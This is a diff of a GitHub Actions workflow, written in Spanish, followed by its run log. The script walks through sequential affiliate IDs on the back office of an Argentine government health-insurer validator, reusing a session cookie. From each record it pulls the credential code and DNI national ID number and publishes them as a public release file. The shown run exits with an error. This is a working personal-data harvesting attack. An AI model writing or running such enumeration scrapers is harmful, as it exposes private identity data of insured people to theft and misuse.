@@ -1,103 +1,63 @@
-name: Scraping IOSFA ENTERPRISE
-
-on:
-  workflow_dispatch:
-    inputs:
-      start_user:
-        description: 'Número de usuario inicial'
-        required: true
-        default: '21000'
-      end_user:
-        description: 'Número de usuario final'
-        required: true
-        default: '21010'
-      release_name:
-        description: 'Nombre del release (opcional)'
-        required: false
-
-permissions:
-  contents: write
-
-jobs:
-  scrap_and_release:
-    runs-on: ubuntu-latest
-    env:
-      OUTPUT: resultado.txt
-      ERROR_LOG: errores.txt
-
-    steps:
-      - uses: actions/checkout@v4
-
-      - name: Ejecutar Scraping
-        shell: bash
-        run: |
-          set +e
-
-          START=${{ github.event.inputs.start_user }}
-          END=${{ github.event.inputs.end_user }}
-          INPUT_RELEASE="${{ github.event.inputs.release_name }}"
-
-          > "$OUTPUT"
-          > "$ERROR_LOG"
-
-          COOKIE_HEADER='_gid=GA1.3.2022856683.1771469080; _ga_56029ZBE95=GS2.1.s1771555226$o2$g0$t1771556191$j60$l0$h0; IOSFABackOffice=XXXX; ASP.NET_SessionId=XXXX'
-
-          # Generar tag automático si no se pasa uno
-          if [ -z "$INPUT_RELEASE" ]; then
-            RELEASE_NAME="IOSFA-$(date +'%Y%m%d-%H%M%S')"
-          else
-            RELEASE_NAME="$INPUT_RELEASE"
-          fi
-
-          echo "RELEASE_NAME=$RELEASE_NAME" >> $GITHUB_ENV
-
-          extract_input() {
-            echo "$RESPONSE" | grep -oP "$1\"[^>]*value=\"\K[^\"]+" 2>/dev/null | head -n1
-          }
-
-          fetch_user() {
-            RESPONSE=$(curl -s -L \
-              -H "User-Agent: Mozilla/5.0" \
-              -H "Cookie: $COOKIE_HEADER" \
-              --max-time 20 \
-              "http://validador.iosfa.gob.ar:5080/Afiliados/Titular/Editar/${1}")
-
-            if [[ "$RESPONSE" == *"login"* ]]; then
-              echo "Sesion expirada detectada." >> "$ERROR_LOG"
-              exit 1
-            fi
-          }
-
-          echo "Scraping desde $START hasta $END"
-
-          for USER_ID in $(seq $START $END); do
-            fetch_user $USER_ID
-
-            if [[ "$RESPONSE" != *"FUERZA DE ORIGEN:"* ]]; then
-              echo "USER $USER_ID = SIN DATOS" >> "$OUTPUT"
-              continue
-            fi
-
-            CODIGO=$(extract_input "txtCodigoCredencial_I")
-            DNI=$(extract_input "txtRefExterna")
-
-            echo "USER=$USER_ID | CODIGO=$CODIGO | DNI=$DNI" >> "$OUTPUT"
-          done
-
-          # Evitar archivo vacío
-          if [ ! -s "$ERROR_LOG" ]; then
-            echo "Sin errores detectados." > "$ERROR_LOG"
-          fi
-
-      - name: Crear / Actualizar Release
-        uses: softprops/action-gh-release@v2
-        with:
-          tag_name: ${{ env.RELEASE_NAME }}
-          name: ${{ env.RELEASE_NAME }}
-          files: |
-            resultado.txt
-            errores.txt
-          fail_on_unmatched_files: false
-          make_latest: true
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+ set +e
+  
+  START=21000
+  END=21001
+  INPUT_RELEASE="ResultadobETA4"
+  
+  > "$OUTPUT"
+  > "$ERROR_LOG"
+  
+  COOKIE_HEADER='_gid=GA1.3.2022856683.1771469080; _ga_56029ZBE95=GS2.1.s1771555226$o2$g0$t1771556191$j60$l0$h0; IOSFABackOffice=XXXX; ASP.NET_SessionId=XXXX'
+  
+  # Generar tag automático si no se pasa uno
+  if [ -z "$INPUT_RELEASE" ]; then
+    RELEASE_NAME="IOSFA-$(date +'%Y%m%d-%H%M%S')"
+  else
+    RELEASE_NAME="$INPUT_RELEASE"
+  fi
+  
+  echo "RELEASE_NAME=$RELEASE_NAME" >> $GITHUB_ENV
+  
+  extract_input() {
+    echo "$RESPONSE" | grep -oP "$1\"[^>]*value=\"\K[^\"]+" 2>/dev/null | head -n1
+  }
+  
+  fetch_user() {
+    RESPONSE=$(curl -s -L \
+      -H "User-Agent: Mozilla/5.0" \
+      -H "Cookie: $COOKIE_HEADER" \
+      --max-time 20 \
+      "http://validador.iosfa.gob.ar:5080/Afiliados/Titular/Editar/${1}")
+  
+    if [[ "$RESPONSE" == *"login"* ]]; then
+      echo "Sesion expirada detectada." >> "$ERROR_LOG"
+      exit 1
+    fi
+  }
+  
+  echo "Scraping desde $START hasta $END"
+  
+  for USER_ID in $(seq $START $END); do
+    fetch_user $USER_ID
+  
+    if [[ "$RESPONSE" != *"FUERZA DE ORIGEN:"* ]]; then
+      echo "USER $USER_ID = SIN DATOS" >> "$OUTPUT"
+      continue
+    fi
+  
+    CODIGO=$(extract_input "txtCodigoCredencial_I")
+    DNI=$(extract_input "txtRefExterna")
+  
+    echo "USER=$USER_ID | CODIGO=$CODIGO | DNI=$DNI" >> "$OUTPUT"
+  done
+  
+  # Evitar archivo vacío
+  if [ ! -s "$ERROR_LOG" ]; then
+    echo "Sin errores detectados." > "$ERROR_LOG"
+  fi
+  shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+  env:
+    OUTPUT: resultado.txt
+    ERROR_LOG: errores.txt
+Scraping desde 21000 hasta 21001
+Error: Process completed with exit code 1.
